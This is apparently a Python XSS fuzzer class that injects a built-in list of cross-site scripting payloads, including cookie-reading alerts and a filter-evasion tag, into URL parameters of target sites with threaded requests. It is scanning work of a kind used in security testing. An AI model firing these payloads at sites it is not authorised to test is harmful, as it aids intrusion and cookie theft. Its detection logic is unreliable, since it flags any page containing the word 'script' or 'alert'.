from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from colorama import Fore, Style
import requests

class XSS:
    def __init__(self, session, threads=5):
        self.session = session
        self.threads = threads
        self.payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '"><script>alert("XSS")</script>',
            '<script>alert(document.cookie)</script>',
            '<img src="#" onerror=alert(document.cookie)>',
            '<body onload=alert("XSS")>',
            '<scr<script>ipt>alert(document.cookie)</script>',
            '#</select><img src=1 onerror=alert(document.cookie)>'
        ]
        self.indicators = ['alert', 'script', 'onerror']  

    def set_payloads(self, payload_list):
        """
        Set custom payloads from a list.
        """
        self.payloads = payload_list

    def filter_targets(self, targets):
        """
        Filter targets to find those with parameters that could be vulnerable to XSS.
        """
        xss_targets = []
        for target in targets:
            for param in target.get('params', []):
                if any(keyword in param['html_type'] for keyword in ['text', 'textarea', 'url']):
                    xss_targets.append(target)
                    break
        return xss_targets

    def test_target(self, target):
        """
        Test a target for XSS vulnerabilities by replacing one parameter's value with a payload,
        while preserving all the original parameters.
        """
        results = []
        original_url = target['url']
        parsed_url = urlparse(original_url)
        original_params = parse_qs(parsed_url.query)

        for param in target['params']:
            param_name = param['name']
            for payload in self.payloads:
                # Create a copy of original parameters and replace the target parameter's value
                new_params = original_params.copy()
                new_params[param_name] = [payload]
                new_query = urlencode(new_params, doseq=True)
                new_url = urlunparse((
                    parsed_url.scheme,
                    parsed_url.netloc,
                    parsed_url.path,
                    parsed_url.params,
                    new_query,
                    parsed_url.fragment
                ))
                try:
                    if param['type'].upper() == 'GET':
                        req = self.session.get(new_url, timeout=7)
                    else:
                        req = self.session.request(param['type'], new_url, timeout=7)
                    
                    if req.status_code == 200 and self.detect_vulnerability(req):
                        results.append({
                            'type': 'XSS',
                            'url': req.url,
                            'param': param_name,
                            'payload': payload,
                            'status': req.status_code,
                            'length': len(req.content),
                            'source': target.get('source', 'unknown')
                        })
                except Exception as e:
                    print(f"{Fore.RED}[!] Error testing target {new_url}: {str(e)}{Style.RESET_ALL}")
                    continue
        return results

    def detect_vulnerability(self, response):
        """
        Detect if the response indicates a potential XSS vulnerability.
        """
        content = response.text.lower()
        return any(ind in content for ind in self.indicators)

    def fuzz(self, targets):
        """
        Fuzz a list of targets for XSS vulnerabilities.
        """
        filtered = self.filter_targets(targets)
        print(f"{Fore.CYAN}[*] Testing {len(filtered)} targets for XSS{Style.RESET_ALL}")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self.test_target, t) for t in filtered]
            results = [r for future in futures for r in future.result() if r]
        
        return results